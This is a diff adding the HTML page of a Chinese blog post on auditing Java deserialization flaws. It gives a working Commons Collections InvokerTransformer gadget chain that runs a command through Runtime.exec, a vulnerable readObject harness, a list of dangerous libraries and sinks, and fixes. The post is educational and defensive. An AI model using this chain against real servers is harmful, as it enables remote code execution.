@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/avatar.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>java代码审计之反序列化 - blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>2nH' blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" false
+         style="background: url('https://s2.ax1x.com/2020/03/06/3qRsC6.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期六, 一月 18日 2020, 10:00 上午
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    1.8k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      7 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto" id="post">
+          
+          <div class="markdown-body">
+            <h1 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h1><p>分享一个java安全的知识库<a href="https://javasec.org/javase/" target="_blank" rel="noopener">https://javasec.org/javase/</a></p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>序列化是当我们需要保存某一刻某个对象的信息，来进行一些操作。比如利用反序列化将程序运行的对象状态以二进制形式储存与文件系统中，然后可以在另一个程序中对序列化后的对象状态数据进行反序列化恢复对象。可以有效地实现多平台之间的通信、对象持久化存储。  </p>
+<h3 id="序列化场景："><a href="#序列化场景：" class="headerlink" title="序列化场景："></a>序列化场景：</h3><p>1.当你想把的内存中的对象保存到一个文件中或者数据库中时候；  </p>
+<p>2.当你想用套接字在网络上传送对象的时候；  </p>
+<p>3.当你想通过RMI传输对象的时候等等。  </p>
+<h3 id="实现序列化条件："><a href="#实现序列化条件：" class="headerlink" title="实现序列化条件："></a>实现序列化条件：</h3><p>1.该类必须实现 java.io.Serializable 接口。</p>
+<p>2.该类的所有属性必须是可序列化的。</p>
+<p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961.png" srcset="/img/loading.gif" alt="1.1"><br>图中类实现类序列化接口。</p>
+<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>这里直接用一个比较经典的利用链来理解反序列化漏洞-Commons Collections Java反序列化漏洞<br>漏洞的利用链在Apache Commons Collections库org.apache.commons.collections.functors.InvokerTransformer<br>具体的链调用流程可以参考网上，如Java反序列化漏洞-玄铁重剑之CommonsCollection系列<br>我们自己调试demo</p>
+<pre><code>package com.serialtest;
+
+import java.io.*;
+import java.util.HashMap;
+import java.util.Map;
+// 用到的commons.collections包
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+public class exp {
+    public static void main(String args[]) throws Exception{
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
+                        String.class, Class[].class }, new Object[] {
+                        &quot;getRuntime&quot;, new Class[0] }),
+
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] {Object.class, Object[].class }, new Object[] {
+                        null, new Object[0] }),      // 执行calc.exe，把这里改成自己要执行的命令即可；服务器是linux就以成linux命令
+        new InvokerTransformer(&quot;exec&quot;, new Class[] {
+                String.class }, new Object[] {&quot;open /System/Applications/Calculator.app&quot;})
+        };
+
+        Transformer transformedChain = new ChainedTransformer(transformers);
+        Map&lt;String,String&gt; beforeTransformerMap = new HashMap&lt;String,String&gt;();
+        beforeTransformerMap.put(&quot;value&quot;, &quot;value&quot;);
+        Map afterTransformerMap = TransformedMap.decorate(beforeTransformerMap, null, transformedChain);
+        // SerObjRewrite中的setValue能触发afterTransformerMap中的代码的执行
+        SerObjRewrite serObj = new SerObjRewrite();
+        serObj.map = afterTransformerMap;
+        // 将对象写入到object.ser
+        FileOutputStream fos = new FileOutputStream(&quot;object.ser&quot;);
+        ObjectOutputStream oos = new ObjectOutputStream(fos);
+        oos.writeObject(serObj);
+        oos.close();
+    }
+}
+
+// 重写SerObj类，其实也不叫重写就随便新实现一个序例化类，重写序列化类的readObject方法，该方法在反序列化时会被自动调用
+// 在readObject中调用setValue，setValue能触发注入代码的调用，这正是代码注入的关键
+class SerObjRewrite implements Serializable {
+    // name可有可无，又不是真重写
+    public String name=&quot;testname&quot;;
+    public Map map;
+
+    private void readObject(java.io.ObjectInputStream in) throws ClassNotFoundException , IOException {
+        in.defaultReadObject();
+        if(map != null){
+            Map.Entry e = (Map.Entry)map.entrySet().iterator().next();
+            e.setValue(&quot;400m&quot;);
+        }
+    }
+}</code></pre><p>这里，我有一个实现了序列化接口的类SerObjRewrite，该类重写了readObject方法，即在反序列化该类时，不仅会调用原始的反序列化流defaultReadObject()，还会实现我们自定义的操作</p>
+<blockquote>
+<p>Map.Entry e = (Map.Entry)map.entrySet().iterator().next();<br>            e.setValue(“400m”);</p>
+</blockquote>
+<p>这里我们运行代码，会生成存有反序列化数据payload的文件，这里把构造的利用链当作参数传给TransformedMap实例afterTransformerMap，然后再赋值给SerObjRewrite类的map参数。<br><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962.png" srcset="/img/loading.gif" alt="1.1">   </p>
+<p>生成了payload，但是在实际应用中，我们是如何传入可控触发点进而利用点呢。<br>这里写了一个对文件的反序列化操作</p>
+<pre><code>package com.serialtest;
+import java.io.*;
+import org.apache.commons.collections.*;
+
+public class str_serial {
+
+    public static void main(String[] args) throws Exception {
+        testSerialString();
+    }
+    public static void testSerialString() throws IOException {
+        String name = &quot;Karen Aya&quot;;
+        Person p = new Person(&quot;test&quot;,10);
+        System.out.println(p.getName());
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;stringSerial.txt&quot;));
+        oos.writeObject(p);
+        oos.close();
+        System.out.println(&quot;ok&quot;);
+
+        FileInputStream fis = new FileInputStream(&quot;object.ser&quot;);
+        ObjectInputStream ois = new ObjectInputStream(fis);
+        try {
+            Object obj =ois.readObject();
+            System.out.println(&quot;---&quot;);
+            System.out.println(obj);
+            System.out.println(&quot;---&quot;);
+            System.out.println(ois);
+        }
+        catch (Exception e){
+            e.printStackTrace();
+        }
+        ois.close();
+
+        }
+    }
+
+
+
+</code></pre><p>这里对object.ser的反序列化，就可以理解为可控点——攻击者传入的恶意数据。<br><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963.png" srcset="/img/loading.gif" alt="1.1"><br>运行，成功弹出计算器。<br>这里的大致流程：<br>反序列化文件-&gt;文件中的SerObjRewrite类-&gt;调用SerObjRewrite类的readObject方法-&gt;map方法的setvalue-&gt;afterTransformerMap触发构造好的利用链<br>这里，SerObjRewrite类是我们自己写的，万一应用中没有这个类呢？<br>这时，我们就需要找漏洞触发点，这里是map的setvalue，其实，jdk包有个AnnotationInvocationHandler类，该类重写readObject，且有setvalue方法。如果开发人员用了Apache Commons Collections基础类，切jdk&lt;1.8可谓是通杀。<br>这里就不再演示了，我们来看看jdk1.8是如何修复的：<br><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%965.png" srcset="/img/loading.gif" alt="1.1"><br><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%964.png" srcset="/img/loading.gif" alt="1.1"><br>jdk1.8把setvalue用=替代了。</p>
+<h2 id="反序列化漏洞挖掘"><a href="#反序列化漏洞挖掘" class="headerlink" title="反序列化漏洞挖掘"></a>反序列化漏洞挖掘</h2><p>首先是一些危险基础库：</p>
+<blockquote>
+<p>commons-fileupload 1.3.1<br>commons-io 2.4<br>commons-collections 3.1<br>commons-logging 1.2<br>commons-beanutils 1.9.2<br>org.slf4j:slf4j-api 1.7.21<br>com.mchange:mchange-commons-java 0.2.11<br>org.apache.commons:commons-collections 4.0<br>com.mchange:c3p0 0.9.5.2<br>org.beanshell:bsh 2.0b5<br>org.codehaus.groovy:groovy 2.3.9<br>org.springframework:spring-aop 4.1.4.RELEASE  </p>
+</blockquote>
+<p><strong>白盒：</strong><br>反序列化操作一般应用在导入模板文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘、或DB存储等业务场景。<br>搜索以下函数：</p>
+<blockquote>
+<p>ObjectInputStream.readObject<br>ObjectInputStream.readUnshared<br>XMLDecoder.readObject<br>Yaml.load<br>XStream.fromXML<br>ObjectMapper.readValue<br>JSON.parseObject<br>找到反序列化输入点后，再找有没有危险函数可利用链（配合ysoserial）</p>
+</blockquote>
+<p><strong>黑盒：</strong><br>在黑盒测试中并不清楚对方的代码架构，但仍然可以通过分析十六进制数据块，锁定某些存在漏洞的通用基础库（比如Apache Commons Collection）的调用地点，并进行数据替换，从而实现利用。<br>在实战过程中，我们可以通过抓包来检测请求中可能存在的序列化数据。<br>序列化数据通常以AC ED开始，之后的两个字节是版本号，版本号一般是00 05但在某些情况下可能是更高的数字。<br><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%966.png" srcset="/img/loading.gif" alt="1.1"> </p>
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>1.使用ObjectInputFilter来校验反序列化的类<br>Java 9包含了支持序列化数据过滤的新特性，开发人员也可以继承java.io.ObjectInputFilter类重写checkInput方法实现自定义的过滤器，，并使用ObjectInputStream对象的setObjectInputFilter设置过滤器来实现反序列化类白/黑名单控制。<br>2.禁止JVM执行外部命令Runtime.exec；<br>3.不建议使用的黑名单，参考contrast-rO0、  ysoserial中paylaod包含的类。  </p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>反序列化漏洞实现：<br>1.有一个可序列化的类，并且该类是重写了readObject()方法的。（主线流程，反序列化漏洞都是这个主线逻辑流程）<br>2.在重写的readObject()方法的逻辑中有<br>直接或间接使用类似method.invoke这种可以执行调用任意方法的函数（文中是通过setvalue触发的链中的method.invoke执行），而且参数可控。（是否还有其他函数可以达到相同的目的呢？）  </p>
+<p>参考：<a href="https://www.cnblogs.com/Fluorescence-tjy/p/11222052.html" target="_blank" rel="noopener">https://www.cnblogs.com/Fluorescence-tjy/p/11222052.html</a><br><a href="https://security.tencent.com/index.php/blog/msg/97" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/97</a><br><a href="http://www.polaris-lab.com/index.php/archives/450/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/archives/450/</a></p>
+
+            <hr>
+          </div>
+          <br>
+          <div>
+            <p>
+            
+              
+              <span>
+                <i class="iconfont icon-tag"></i>
+                
+                  <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                
+              </span>
+            
+            </p>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container">
+        <div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+      </div>
+    
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+      <br><br>
+      
+      
+  <script defer src="https://utteranc.es/client.js"
+          repo="huuuz/huuuz.github.io"
+          issue-term="pathname"
+  
+          label="utterances"
+    
+          theme="github-light"
+          crossorigin="anonymous"
+          async>
+  </script>
+
+
+    
+  </div>
+</div>
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+
+    
+  <div>
+    
+      <!-- 不蒜子统计PV -->
+      
+      <span id="busuanzi_container_site_pv" style="display: none">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    </span>
+    
+    
+      <!-- 不蒜子统计UV -->
+      
+      <span id="busuanzi_container_site_uv" style="display: none">
+      总访客数 <span id="busuanzi_value_site_uv"></span> 人
+    </span>
+    
+  </div>
+
+
+    
+
+    <!-- cnzz Analytics icon -->
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var main = $('main');
+      var tocT = navHeight + (toc.offset().top - main.offset().top);
+      var tocLimMin = main.offset().top - navHeight;
+      var tocLimMax = $('#comments').offset().top - navHeight;
+      $(window).scroll(function () {
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': tocT,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "java代码审计之反序列化&nbsp;",
+      ],
+      cursorChar: "🐶",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
